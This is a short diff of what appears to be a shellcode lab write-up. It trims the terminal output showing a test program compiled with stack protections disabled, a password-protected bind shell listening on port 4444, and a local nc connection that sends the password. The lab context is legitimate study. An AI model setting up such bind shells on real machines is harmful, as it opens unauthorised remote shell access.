@@ -566,17 +566,9 @@ osboxes@osboxes:~/Pass_Bind_Shell$ gcc -fno-stack-protector -z execstack shellco
 osboxes@osboxes:~/Pass_Bind_Shell$ ./shellcode 
 Shellcode Length:  191
 
-osboxes@osboxes:~$ netstat -antl
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State      
-tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN     
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
-tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
-<b>tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN</b>     
-tcp        1      0 192.168.1.126:46307     91.189.92.93:80         CLOSE_WAIT 
-tcp        0      0 192.168.1.126:22        192.168.1.123:50078     ESTABLISHED
-tcp        0      0 192.168.1.126:22        192.168.1.123:50164     ESTABLISHED
-tcp6       0      0 :::22                   :::*                    LISTEN     
+osboxes@osboxes:~$ netstat -antl | grep 4444
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN
+
 osboxes@osboxes:~$ nc -nv 127.0.0.1 4444
 Connection to 127.0.0.1 4444 port [tcp/*] succeeded!
 8bytesss
